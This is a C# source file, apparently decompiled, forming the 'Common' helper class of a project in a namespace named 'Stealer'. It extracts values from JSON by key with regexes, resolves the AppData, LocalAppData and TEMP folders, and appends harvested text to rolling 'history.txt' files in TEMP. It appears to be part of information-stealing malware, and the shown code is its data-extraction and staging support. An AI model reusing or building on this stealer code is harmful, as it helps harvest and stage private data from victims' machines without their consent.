using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Stealer
{
	// Token: 0x02000052 RID: 82
	internal class Common
	{
		// Token: 0x06000202 RID: 514 RVA: 0x0001113C File Offset: 0x0000F33C
		public static string Extract(string target, string content)
		{
			string text = string.Empty;
			foreach (object obj in new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")").Matches(content))
			{
				text = ((Match)obj).Groups[1].Value;
			}
			text = text.Replace("\"", "");
			return text;
		}

		// Token: 0x06000203 RID: 515 RVA: 0x000111CC File Offset: 0x0000F3CC
		public static List<string> RegexJson(string content, string regex)
		{
			List<string> list = new List<string>();
			foreach (object obj in new Regex(regex, RegexOptions.Compiled).Matches(content))
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					list.Add(match.Groups[1].Value);
				}
			}
			return list;
		}

		// Token: 0x06000204 RID: 516 RVA: 0x0001124C File Offset: 0x0000F44C
		public static void WriteToFile(string writeText)
		{
			Common.fileName = Common.tempFolder + "\\history.txt";
			if (File.Exists(Common.fileName))
			{
				if ((File.ReadAllText(Common.fileName).Length + writeText.Length) / 1024 > 8000)
				{
					Common.fileCounter++;
					Common.fileName = Common.tempFolder + "\\history_" + Common.fileCounter.ToString() + ".txt";
					StreamWriter streamWriter = new StreamWriter(Common.fileName, true);
					streamWriter.WriteLine(writeText);
					streamWriter.Close();
					return;
				}
				StreamWriter streamWriter2 = new StreamWriter(Common.fileName, true);
				streamWriter2.WriteLine(writeText);
				streamWriter2.Close();
			}
		}

		// Token: 0x0400064D RID: 1613
		private static int fileCounter = 1;

		// Token: 0x0400064E RID: 1614
		public static string fileName = string.Empty;

		// Token: 0x0400064F RID: 1615
		public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000650 RID: 1616
		public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000651 RID: 1617
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
	}
}
